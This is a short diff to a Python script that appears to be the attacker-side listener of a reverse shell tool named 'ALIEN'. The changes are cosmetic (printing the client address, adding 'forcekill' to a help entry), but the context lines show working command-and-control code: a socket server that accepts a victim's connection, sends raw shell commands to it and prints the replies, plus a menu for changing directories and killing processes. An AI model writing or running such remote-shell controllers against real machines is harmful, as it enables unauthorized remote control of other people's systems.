@@ -20,7 +20,7 @@ print(Fore.BLUE+'[*]'+Fore.RESET+f' Started Reverse TCP Connection At {HOST}:{PO
 Server.listen(1)                        # waiting for the user to connect 
 
 Client, Addr = Server.accept()                              # our client and client info module and accepting the connection 
-print(Fore.YELLOW+"[+]"+Fore.RESET+f" Got Connection: {HOST}:{PORT}")
+print(Fore.YELLOW+"[+]"+Fore.RESET+f" Got Connection: {Addr}")
 
 while True:                                                     #start while True 
 
@@ -63,11 +63,10 @@ ALIEN Reverse Shell Commands
 4 -> chdir "PATH\DIR"      | Change the directory "cd"
 5 -> path                  | Show current directory (path)
 6 -> back                  | Go back from existing directory (one-by)
-7 -> stop "NAME\PID"       | Stop\kill a process by name or PID   
+7 -> stop "NAME\PID"       | Stop\kill\\forcekill a process by name or PID   
 """)
 
     else:
         Client.send(bytes(Shell_User, encoding="utf-8"))               # if user didnt entred any command send raw command 
         Client_R   = str(Client.recv(1024), 'utf-8')                   # if user didnt entred any command show raw command 
-
         print(Client_R)                                                # print client respond 
